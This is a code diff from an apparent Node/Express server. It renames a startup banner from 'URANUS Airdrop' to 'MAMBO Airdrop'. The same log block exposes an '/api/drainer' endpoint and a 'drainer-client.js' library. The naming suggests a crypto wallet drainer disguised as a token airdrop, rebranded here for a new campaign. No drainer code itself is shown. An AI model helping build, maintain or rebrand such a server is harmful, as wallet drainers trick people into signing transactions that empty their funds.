@@ -159,7 +159,7 @@ app.get('/', (req, res) => {
 // Start server
 app.listen(PORT, () => {
   console.log(`🚀 Server running on http://localhost:${PORT}`);
-  console.log(`📱 URANUS Airdrop: http://localhost:${PORT}`);
+  console.log(`📱 MAMBO Airdrop: http://localhost:${PORT}`);
   console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/drainer`);
   console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
 }); 
